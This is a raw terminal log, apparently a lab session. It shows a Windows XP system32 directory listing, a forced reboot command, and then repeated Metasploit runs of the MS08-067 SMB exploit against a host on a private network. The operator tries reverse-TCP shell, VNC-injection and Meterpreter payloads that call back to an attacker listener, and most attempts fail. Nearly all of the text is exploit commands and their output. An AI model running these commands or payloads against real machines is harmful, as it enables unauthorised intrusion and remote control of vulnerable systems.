+08/23/2001  05:30 PM            24,603 sqlwid.dll
+08/23/2001  05:30 PM            49,179 sqlwoa.dll
+08/04/2004  12:56 AM            67,584 srclient.dll
+08/04/2004  12:56 AM           239,104 srrstr.dll
+08/04/2004  12:56 AM           170,496 srsvc.dll
+08/04/2004  12:56 AM            96,768 srvsvc.dll
+08/04/2004  12:56 AM           704,512 ss3dfo.scr
+08/04/2004  12:56 AM            19,968 ssbezier.scr
+08/04/2004  12:56 AM            34,816 ssdpapi.dll
+08/04/2004  12:56 AM            71,680 ssdpsrv.dll
+08/04/2004  12:56 AM           393,216 ssflwbox.scr
+08/04/2004  12:56 AM            20,992 ssmarque.scr
+08/04/2004  12:56 AM            47,104 ssmypics.scr
+08/04/2004  12:56 AM            18,944 ssmyst.scr
+08/04/2004  12:56 AM           610,304 sspipes.scr
+08/04/2004  12:56 AM            14,336 ssstars.scr
+08/04/2004  12:56 AM           679,936 sstext3d.scr
+08/23/2001  05:30 PM            54,272 stclient.dll
+08/23/2001  05:30 PM            17,920 stdole2.tlb
+08/23/2001  05:30 PM             7,168 stdole32.tlb
+08/04/2004  12:56 AM            67,584 sti.dll
+08/04/2004  12:56 AM            14,848 stimon.exe
+08/04/2004  12:56 AM           136,704 sti_ci.dll
+08/04/2004  12:56 AM           121,856 stobject.dll
+08/23/2001  05:30 PM             4,208 storage.dll
+08/04/2004  06:26 AM            74,752 storprop.dll
+08/23/2001  05:30 PM             8,192 streamci.dll
+08/04/2004  12:56 AM           246,302 strmdll.dll
+08/04/2004  12:56 AM            75,776 strmfilt.dll
+08/23/2001  05:30 PM            93,702 subrange.uce
+08/23/2001  05:30 PM             9,216 subst.exe
+08/04/2004  12:56 AM            14,336 svchost.exe
+08/23/2001  05:30 PM             6,144 svcpack.dll
+08/23/2001  05:30 PM           138,752 swprv.dll
+08/04/2004  12:56 AM           713,216 sxs.dll
+08/23/2001  05:30 PM            51,200 syncapp.exe
+08/04/2004  12:56 AM            57,856 synceng.dll
+08/04/2004  12:56 AM           191,488 syncui.dll
+08/04/2004  12:56 AM           298,496 sysdm.cpl
+08/23/2001  05:30 PM            18,896 sysedit.exe
+08/23/2001  05:30 PM            15,872 sysinv.dll
+08/23/2001  05:30 PM            36,864 syskey.exe
+08/03/2004  11:00 PM           218,624 sysmon.ocx
+08/04/2004  12:56 AM           105,984 sysocmgr.exe
+08/23/2001  05:30 PM             3,214 sysprint.sep
+08/23/2001  05:30 PM             3,577 sysprtj.sep
+08/04/2004  12:56 AM           984,576 syssetup.dll
+08/23/2001  05:30 PM             3,360 system.drv
+08/23/2001  05:30 PM            68,096 systeminfo.exe
+08/23/2001  05:30 PM             3,072 systray.exe
+08/04/2004  12:56 AM           210,432 t2embed.dll
+08/23/2001  05:30 PM            19,200 tapi.dll
+08/04/2004  12:56 AM           858,624 tapi3.dll
+08/04/2004  12:56 AM           181,760 tapi32.dll
+08/23/2001  05:30 PM             5,632 tapiperf.dll
+08/04/2004  12:56 AM           246,272 tapisrv.dll
+08/23/2001  05:30 PM            78,848 tapiui.dll
+08/23/2001  05:30 PM            72,192 taskkill.exe
+08/23/2001  05:30 PM            72,192 tasklist.exe
+08/23/2001  05:30 PM            15,360 taskman.exe
+08/04/2004  12:56 AM           135,680 taskmgr.exe
+08/23/2001  05:30 PM            12,288 tcmsetup.exe
+08/04/2004  12:56 AM            14,848 tcpmib.dll
+08/04/2004  12:56 AM            45,568 tcpmon.dll
+07/17/2004  11:46 AM            53,478 tcpmon.ini
+08/04/2004  12:56 AM            45,568 tcpmonui.dll
+08/23/2001  05:30 PM            19,456 tcpsvcs.exe
+08/03/2004  10:59 PM            61,440 tdc.ocx
+08/23/2001  05:30 PM            28,160 telephon.cpl
+08/04/2004  12:56 AM            75,264 telnet.exe
+07/17/2004  11:42 AM               862 termcap
+08/04/2004  12:56 AM           358,400 termmgr.dll
+08/04/2004  12:56 AM           295,424 termsrv.dll
+08/23/2001  05:30 PM            16,896 tftp.exe
+08/04/2004  12:56 AM           385,536 themeui.dll
+08/04/2004  12:56 AM            94,208 timedate.cpl
+08/23/2001  05:30 PM             4,048 timer.drv
+08/04/2004  12:56 AM            61,440 tlntadmn.exe
+08/04/2004  12:56 AM            78,336 tlntsess.exe
+08/04/2004  12:56 AM            73,216 tlntsvr.exe
+08/04/2004  12:56 AM             7,168 tlntsvrp.dll
+08/23/2001  05:30 PM            13,888 toolhelp.dll
+08/04/2004  12:56 AM           347,136 tourstart.exe
+08/04/2004  12:56 AM           259,584 tracerpt.exe
+08/04/2004  12:56 AM            12,288 tracert.exe
+08/23/2001  05:30 PM            31,744 tracert6.exe
+08/23/2001  05:30 PM            31,232 traffic.dll
+08/23/2001  05:30 PM            11,264 tree.com
+08/04/2004  12:56 AM            90,624 trkwks.dll
+08/23/2001  05:30 PM            52,224 tsappcmp.dll
+08/23/2001  05:30 PM             8,192 tsbyuv.dll
+08/04/2004  12:56 AM            93,696 tscfgwmi.dll
+08/23/2001  05:30 PM            14,848 tscon.exe
+08/03/2004  10:59 PM            44,544 tscupgrd.exe
+08/23/2001  05:30 PM            15,360 tsd32.dll
+08/04/2004  01:01 AM            12,168 tsddd.dll
+08/23/2001  05:30 PM            14,848 tsdiscon.exe
+08/23/2001  05:30 PM            16,384 tskill.exe
+08/23/2001  05:30 PM             3,286 tslabels.h
+08/23/2001  05:30 PM            13,223 tslabels.ini
+08/23/2001  05:30 PM            16,896 tsshutdn.exe
+08/23/2001  05:30 PM             8,192 tssoft32.acm
+08/04/2004  12:56 AM            44,032 twext.dll
+08/04/2004  12:56 AM           101,376 txflog.dll
+08/23/2001  05:30 PM           177,856 typelib.dll
+08/23/2001  05:30 PM            36,352 typeperf.exe
+08/04/2004  12:56 AM            25,600 udhisapi.dll
+08/23/2001  05:30 PM            82,432 ufat.dll
+08/04/2004  12:56 AM           275,456 ulib.dll
+08/04/2004  12:56 AM            35,840 umandlg.dll
+08/23/2001  05:30 PM            13,312 umdmxfrm.dll
+08/04/2004  12:56 AM           118,272 umpnpmgr.dll
+08/23/2001  05:30 PM            89,588 unicode.nls
+08/04/2004  12:56 AM           206,848 unimdm.tsp
+08/04/2004  12:56 AM            74,240 unimdmat.dll
+08/04/2004  12:56 AM            13,824 uniplat.dll
+08/23/2001  05:30 PM             4,096 unlodctr.exe
+08/04/2004  12:56 AM           316,416 untfs.dll
+08/04/2004  12:56 AM           132,608 upnp.dll
+08/04/2004  12:56 AM            16,896 upnpcont.exe
+08/04/2004  12:56 AM           185,344 upnphost.dll
+08/04/2004  12:56 AM           239,616 upnpui.dll
+08/04/2004  12:56 AM            18,432 ups.exe
+08/23/2001  05:30 PM            17,920 ureg.dll
+08/04/2004  12:56 AM            37,888 url.dll
+08/04/2004  12:56 AM           601,088 urlmon.dll
+08/04/2004  12:56 AM            16,896 usbmon.dll
+08/04/2004  06:26 AM            74,240 usbui.dll
+08/23/2001  05:30 PM            47,872 user.exe
+08/04/2004  12:56 AM           577,024 user32.dll
+08/04/2004  12:56 AM           723,456 userenv.dll
+08/04/2004  12:56 AM            24,576 userinit.exe
+09/23/2018  05:39 AM    <DIR>          usmt
+08/04/2004  12:56 AM           406,528 usp10.dll
+08/23/2001  05:30 PM            61,500 usrcntra.dll
+08/23/2001  05:30 PM            69,699 usrcoina.dll
+08/23/2001  05:30 PM            77,890 usrdpa.dll
+08/23/2001  05:30 PM           323,641 usrdtea.dll
+08/23/2001  05:30 PM            86,073 usrfaxa.dll
+08/23/2001  05:30 PM            53,305 usrlbva.dll
+08/23/2001  05:30 PM             1,161 usrlogon.cmd
+08/23/2001  05:30 PM            77,891 usrmlnka.exe
+08/23/2001  05:30 PM            61,508 usrprbda.exe
+08/23/2001  05:30 PM            77,883 usrrtosa.dll
+08/23/2001  05:30 PM            49,211 usrsdpia.dll
+08/23/2001  05:30 PM            69,700 usrshuta.exe
+08/23/2001  05:30 PM            41,019 usrsvpia.dll
+08/23/2001  05:30 PM           102,457 usrv42a.dll
+08/23/2001  05:30 PM            49,209 usrv80a.dll
+08/23/2001  05:30 PM            45,116 usrvoica.dll
+08/23/2001  05:30 PM            49,211 usrvpa.dll
+08/23/2001  05:30 PM            25,600 utildll.dll
+08/04/2004  12:56 AM            50,176 utilman.exe
+08/04/2004  12:56 AM           218,624 uxtheme.dll
+08/23/2001  05:30 PM            18,832 v7vga.rom
+08/04/2004  12:56 AM            30,749 vbajet32.dll
+08/04/2004  12:56 AM            53,248 vbicodec.ax
+08/04/2004  12:56 AM            30,720 vbisurf.ax
+08/14/2018  05:21 PM         1,215,616 VBoxControl.exe
+08/14/2018  05:21 PM            76,992 VBoxDisp.dll
+08/14/2018  05:21 PM            56,152 VBoxHook.dll
+08/14/2018  05:21 PM         1,156,344 VBoxMRXNP.dll
+08/14/2018  05:21 PM           380,776 VBoxOGL.dll
+08/14/2018  05:21 PM           505,960 VBoxOGLarrayspu.dll
+08/14/2018  05:21 PM         1,363,128 VBoxOGLcrutil.dll
+08/14/2018  05:21 PM           126,744 VBoxOGLerrorspu.dll
+08/14/2018  05:21 PM           788,056 VBoxOGLfeedbackspu.dll
+08/14/2018  05:21 PM         1,565,176 VBoxOGLpackspu.dll
+08/14/2018  05:21 PM            87,232 VBoxOGLpassthroughspu.dll
+08/14/2018  05:21 PM         1,641,120 VBoxService.exe
+08/14/2018  05:21 PM         1,620,280 VBoxTray.exe
+08/04/2004  12:56 AM           417,792 vbscript.dll
+08/23/2001  05:30 PM             7,680 vcdex.dll
+08/04/2004  12:56 AM            26,112 vdmdbg.dll
+08/04/2004  12:56 AM            51,712 vdmredir.dll
+08/23/2001  05:30 PM             9,008 ver.dll
+08/23/2001  05:30 PM            13,312 verifier.dll
+08/23/2001  05:30 PM            98,304 verifier.exe
+08/04/2004  12:56 AM            18,944 version.dll
+08/23/2001  05:30 PM            20,535 vfpodbc.dll
+08/23/2001  05:30 PM             9,344 vga.dll
+08/23/2001  05:30 PM             2,176 vga.drv
+08/23/2001  05:30 PM            51,456 vga256.dll
+08/23/2001  05:30 PM            18,176 vga64k.dll
+08/23/2001  05:30 PM                75 View Channels.scf
+08/23/2001  05:30 PM             4,608 vjoy.dll
+08/23/2001  05:30 PM            33,792 vssadmin.exe
+08/04/2004  12:56 AM           430,592 vssapi.dll
+08/04/2004  12:56 AM           289,792 vssvc.exe
+08/23/2001  05:30 PM            16,896 vss_ps.dll
+08/23/2001  05:30 PM            19,456 vwipxspx.dll
+08/23/2001  05:30 PM             1,129 vwipxspx.exe
+08/04/2004  12:56 AM           174,592 w32time.dll
+08/23/2001  05:30 PM            49,664 w32tm.exe
+08/23/2001  05:30 PM            22,016 w32topl.dll
+08/04/2004  12:56 AM            15,872 w3ssl.dll
+08/03/2004  11:07 PM            17,664 watchdog.sys
+08/23/2001  05:30 PM           208,896 wavemsp.dll
+08/23/2001  05:30 PM            65,489 wbcache.deu
+08/23/2001  05:30 PM            65,489 wbcache.enu
+08/23/2001  05:30 PM            65,489 wbcache.esn
+08/23/2001  05:30 PM            65,489 wbcache.fra
+08/23/2001  05:30 PM            65,489 wbcache.ita
+08/23/2001  05:30 PM            65,489 wbcache.nld
+08/23/2001  05:30 PM            65,489 wbcache.sve
+08/23/2001  05:30 PM         1,309,184 wbdbase.deu
+08/23/2001  05:30 PM           957,440 wbdbase.enu
+08/23/2001  05:30 PM           750,080 wbdbase.esn
+08/23/2001  05:30 PM           786,944 wbdbase.fra
+08/23/2001  05:30 PM           867,840 wbdbase.ita
+08/23/2001  05:30 PM         1,095,680 wbdbase.nld
+08/23/2001  05:30 PM           937,984 wbdbase.sve
+09/23/2018  12:15 AM    <DIR>          wbem
+08/04/2004  12:56 AM            49,152 wdigest.dll
+08/23/2001  05:30 PM             4,096 wdl.trm
+08/04/2004  01:05 AM            23,552 wdmaud.drv
+08/04/2004  12:56 AM           276,480 webcheck.dll
+08/04/2004  12:56 AM            67,584 webclnt.dll
+07/17/2004  11:35 AM         1,326,080 webfldrs.msi
+08/23/2001  05:30 PM            40,448 webhits.dll
+08/04/2004  12:56 AM           135,680 webvw.dll
+08/04/2004  12:56 AM            65,536 wextract.exe
+08/23/2001  05:30 PM            13,600 wfwnet.drv
+08/04/2004  12:56 AM           433,664 wiaacmgr.exe
+08/04/2004  12:56 AM           463,360 wiadefui.dll
+08/04/2004  12:56 AM           124,416 wiadss.dll
+08/04/2004  12:56 AM            75,776 wiascr.dll
+08/04/2004  12:56 AM           333,312 wiaservc.dll
+08/23/2001  05:30 PM            40,448 wiasf.ax
+08/04/2004  12:56 AM           589,312 wiashext.dll
+08/04/2004  12:56 AM           111,104 wiavideo.dll
+08/23/2001  05:30 PM           145,408 wiavusd.dll
+08/23/2001  05:30 PM             9,216 wifeman.dll
+08/23/2001  05:30 PM            18,432 win.com
+08/03/2004  11:17 PM         1,835,904 win32k.sys
+08/04/2004  12:56 AM           101,888 win32spl.dll
+08/23/2001  05:30 PM            13,312 win87em.dll
+08/04/2004  12:56 AM           937,984 winbrand.dll
+08/23/2001  05:30 PM            35,328 winchat.exe
+08/23/2001  05:30 PM             9,216 winfax.dll
+08/23/2001  05:30 PM            32,674 winhelp.hlp
+08/23/2001  05:30 PM             8,192 winhlp32.exe
+08/04/2004  12:56 AM           351,232 winhttp.dll
+08/04/2004  12:56 AM           656,384 wininet.dll
+08/04/2004  12:56 AM            32,768 winipsec.dll
+08/04/2004  12:56 AM           502,272 winlogon.exe
+08/23/2001  05:30 PM           119,808 winmine.exe
+08/04/2004  12:56 AM           176,128 winmm.dll
+08/23/2001  05:30 PM            11,776 winmsd.exe
+08/03/2004  10:51 PM             5,120 winnls.dll
+08/04/2004  12:56 AM           764,928 winntbbu.dll
+08/23/2001  05:30 PM             2,080 winoldap.mod
+08/04/2004  12:56 AM            16,896 winrnr.dll
+09/23/2018  05:38 AM    <DIR>          wins
+08/04/2004  12:56 AM            99,328 winscard.dll
+08/04/2004  12:56 AM            17,408 winshfhc.dll
+08/23/2001  05:30 PM             2,864 winsock.dll
+08/04/2004  12:56 AM           146,432 winspool.drv
+08/23/2001  05:30 PM             2,112 winspool.exe
+08/04/2004  12:56 AM           290,816 winsrv.dll
+08/04/2004  12:56 AM            53,760 winsta.dll
+08/23/2001  05:30 PM            18,944 winstrm.dll
+08/04/2004  12:56 AM           176,640 wintrust.dll
+08/04/2004  12:56 AM             5,632 winver.exe
+08/04/2004  12:56 AM           132,096 wkssvc.dll
+08/04/2004  12:56 AM           172,032 wldap32.dll
+08/04/2004  12:56 AM            92,672 wlnotify.dll
+08/04/2004  12:56 AM           408,064 wmadmod.dll
+08/04/2004  12:56 AM           670,720 wmadmoe.dll
+08/04/2004  12:56 AM           230,400 wmasf.dll
+08/04/2004  12:56 AM            27,136 wmdmlog.dll
+08/04/2004  12:56 AM            23,552 wmdmps.dll
+08/23/2001  05:30 PM            51,200 wmerrenu.dll
+08/04/2004  12:56 AM           168,448 wmerror.dll
+08/04/2004  12:56 AM             5,632 wmi.dll
+08/04/2004  12:56 AM           151,552 wmidx.dll
+08/23/2001  05:30 PM            63,488 wmimgmt.msc
+08/23/2001  05:30 PM            18,944 wmiprop.dll
+08/23/2001  05:30 PM            55,808 wmiscmgr.dll
+08/04/2004  12:56 AM         1,050,624 wmnetmgr.dll
+08/04/2004  12:56 AM         4,874,240 wmp.dll
+08/03/2004  11:04 PM            20,480 wmp.ocx
+08/04/2004  12:56 AM           114,688 wmpasf.dll
+08/04/2004  12:56 AM            20,480 wmpcd.dll
+08/04/2004  12:56 AM            20,480 wmpcore.dll
+08/04/2004  12:56 AM           233,472 wmpdxm.dll
+08/04/2004  12:56 AM         2,940,928 wmploc.dll
+08/04/2004  12:56 AM           102,400 wmpshell.dll
+08/04/2004  12:56 AM            20,480 wmpui.dll
+08/04/2004  12:56 AM           759,296 wmsdmod.dll
+08/04/2004  12:56 AM           115,200 wmsdmoe.dll
+08/04/2004  12:56 AM         1,119,744 wmsdmoe2.dll
+08/04/2004  12:56 AM           484,864 wmspdmod.dll
+08/04/2004  12:56 AM           896,512 wmspdmoe.dll
+08/04/2004  12:56 AM           303,616 wmstream.dll
+08/04/2004  12:56 AM           278,559 wmv8ds32.ax
+08/04/2004  12:57 AM         2,105,344 wmvcore.dll
+08/04/2004  12:56 AM           809,984 wmvdmod.dll
+08/04/2004  12:56 AM         1,001,472 wmvdmoe2.dll
+08/04/2004  12:56 AM           258,048 wmvds32.ax
+08/04/2004  12:56 AM           264,192 wow32.dll
+08/23/2001  05:30 PM             2,736 wowdeb.exe
+08/23/2001  05:30 PM            10,368 wowexec.exe
+08/23/2001  05:30 PM             3,200 wowfax.dll
+08/23/2001  05:30 PM            13,824 wowfaxui.dll
+07/13/2019  05:28 PM             2,206 wpa.dbl
+08/04/2004  12:56 AM            32,256 wpabaln.exe
+08/04/2004  12:56 AM            32,256 wpnpinst.exe
+08/23/2001  05:30 PM             5,632 write.exe
+08/04/2004  12:56 AM            19,968 ws2help.dll
+08/04/2004  12:56 AM            82,944 ws2_32.dll
+08/04/2004  12:56 AM            13,824 wscntfy.exe
+08/04/2004  12:56 AM           114,688 wscript.exe
+08/04/2004  12:56 AM            81,408 wscsvc.dll
+08/04/2004  12:56 AM           148,480 wscui.cpl
+08/04/2004  12:56 AM           596,992 wsecedit.dll
+08/23/2001  05:30 PM             9,216 wshatm.dll
+08/04/2004  12:56 AM           108,032 wshbth.dll
+08/04/2004  12:56 AM            28,672 wshcon.dll
+08/04/2004  12:56 AM            65,536 wshext.dll
+08/04/2004  12:56 AM            14,336 wship6.dll
+08/23/2001  05:30 PM            11,776 wshisn.dll
+08/23/2001  05:30 PM             7,168 wshnetbs.dll
+08/03/2004  11:01 PM            98,304 wshom.ocx
+08/04/2004  12:56 AM            11,776 WshRm.dll
+08/04/2004  12:56 AM            19,968 wshtcpip.dll
+08/04/2004  12:56 AM            42,496 wsnmp32.dll
+08/04/2004  12:56 AM            22,528 wsock32.dll
+08/04/2004  12:56 AM            50,688 wstdecod.dll
+08/04/2004  12:56 AM           164,352 wstpager.ax
+08/04/2004  12:56 AM           239,616 wstrenderer.ax
+08/04/2004  12:56 AM            18,432 wtsapi32.dll
+08/04/2004  12:56 AM           430,592 wuapi.dll
+08/04/2004  12:56 AM           111,104 wuauclt.exe
+08/04/2004  12:56 AM           165,888 wuauclt1.exe
+08/04/2004  12:56 AM           162,304 wuaucpl.cpl
+08/04/2004  12:56 AM         1,134,592 wuaueng.dll
+08/04/2004  12:56 AM           183,296 wuaueng1.dll
+08/04/2004  12:56 AM             6,656 wuauserv.dll
+08/04/2004  12:56 AM           112,640 wucltui.dll
+08/23/2001  05:30 PM            32,256 wupdmgr.exe
+08/04/2004  12:56 AM            36,864 wups.dll
+08/04/2004  12:56 AM           120,320 wuweb.dll
+08/04/2004  12:56 AM           378,368 wzcdlg.dll
+08/04/2004  01:05 AM            51,712 wzcsapi.dll
+08/04/2004  01:05 AM           359,936 wzcsvc.dll
+08/04/2004  12:56 AM            91,648 xactsrv.dll
+08/04/2004  12:56 AM            30,720 xcopy.exe
+07/17/2004  11:39 AM           174,200 xenroll.dll
+09/23/2018  12:15 AM    <DIR>          xircom
+08/04/2004  12:56 AM           129,536 xmlprov.dll
+08/04/2004  12:56 AM            50,176 xmlprovi.dll
+08/04/2004  12:56 AM            11,776 xolehlp.dll
+08/04/2004  12:56 AM           438,784 xpob2res.dll
+08/04/2004  12:56 AM           187,392 xpsp1res.dll
+08/04/2004  12:56 AM         2,897,920 xpsp2res.dll
+08/04/2004  12:56 AM           337,920 zipfldr.dll
+            1799 File(s)    305,448,755 bytes
+              40 Dir(s)  18,945,781,760 bytes free
+
+C:\WINDOWS\system32>shutdown -r -t 0 
+shutdown -r -t 0
+
+C:\WINDOWS\system32>set payload windows/windows/vncinject/reverse_tcp
+
+[*] 192.168.0.116 - Command shell session 2 closed.  Reason: User exit
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.0.116    yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2+ - lang:Unknown
+[-] 192.168.0.116:445 - Could not determine the exact service pack
+[-] 192.168.0.116:445 - Auto-targeting failed, use 'show targets' to manually select one
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2+ - lang:Unknown
+[-] 192.168.0.116:445 - Could not determine the exact service pack
+[-] 192.168.0.116:445 - Auto-targeting failed, use 'show targets' to manually select one
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2+ - lang:Unknown
+[-] 192.168.0.116:445 - Could not determine the exact service pack
+[-] 192.168.0.116:445 - Auto-targeting failed, use 'show targets' to manually select one
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2 - lang:Unknown
+[*] 192.168.0.116:445 - We could not detect the language pack, defaulting to English
+[*] 192.168.0.116:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] 192.168.0.116:445 - Attempting to trigger the vulnerability...
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > <pre>payload windows/windows/vncinject/reverse_tcp
+[-] Unknown command: <pre>payload.
+msf exploit(windows/smb/ms08_067_netapi) > </pre>payload windows/windows/vncinject/reverse_tcp
+[-] Unknown command: </pre>payload.
+msf exploit(windows/smb/ms08_067_netapi) > set payload windows/windows/vncinject/reverse_tcp
+
+^[[A[-] The value specified for payload is not valid.
+msf exploit(windows/smb/ms08_067_netapi) > 
+msf exploit(windows/smb/ms08_067_netapi) > </pre>payload windows/vncinject/reverse_tcp
+[-] Unknown command: </pre>payload.
+msf exploit(windows/smb/ms08_067_netapi) > payload windows/vncinject/reverse_tcp
+[-] Unknown command: payload.
+msf exploit(windows/smb/ms08_067_netapi) > set payload windows/vncinject/reverse_tcp
+payload => windows/vncinject/reverse_tcp
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.0.116    yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/vncinject/reverse_tcp):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   AUTOVNC               true             yes       Automatically launch VNC viewer if present
+   DisableCourtesyShell  true             no        Disables the Metasploit Courtesy shell
+   EXITFUNC              thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                 192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT                 4444             yes       The listen port
+   VNCHOST               127.0.0.1        yes       The local host to use for the VNC proxy
+   VNCPORT               5900             yes       The local port to use for the VNC proxy
+   ViewOnly              true             no        Runs the viewer in view mode
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+^C[-] 192.168.0.116:445 - Exploit failed: Interrupt 
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2+ - lang:Unknown
+[-] 192.168.0.116:445 - Could not determine the exact service pack
+[-] 192.168.0.116:445 - Auto-targeting failed, use 'show targets' to manually select one
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.0.116    yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/vncinject/reverse_tcp):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   AUTOVNC               true             yes       Automatically launch VNC viewer if present
+   DisableCourtesyShell  true             no        Disables the Metasploit Courtesy shell
+   EXITFUNC              thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                 192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT                 4444             yes       The listen port
+   VNCHOST               127.0.0.1        yes       The local host to use for the VNC proxy
+   VNCPORT               5900             yes       The local port to use for the VNC proxy
+   ViewOnly              true             no        Runs the viewer in view mode
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
+[*] 192.168.0.116:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[-] 192.168.0.116:445 - Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_PIPE_NOT_AVAILABLE (Command=162 WordCount=0)
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2+ - lang:English
+[-] 192.168.0.116:445 - Could not determine the exact service pack
+[-] 192.168.0.116:445 - Auto-targeting failed, use 'show targets' to manually select one
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.0.116    yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/vncinject/reverse_tcp):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   AUTOVNC               true             yes       Automatically launch VNC viewer if present
+   DisableCourtesyShell  true             no        Disables the Metasploit Courtesy shell
+   EXITFUNC              thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                 192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT                 4444             yes       The listen port
+   VNCHOST               127.0.0.1        yes       The local host to use for the VNC proxy
+   VNCPORT               5900             yes       The local port to use for the VNC proxy
+   ViewOnly              true             no        Runs the viewer in view mode
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.0.116    yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[-] 192.168.0.116:445 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (192.168.0.116:445).
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[-] 192.168.0.116:445 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (192.168.0.116:445).
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
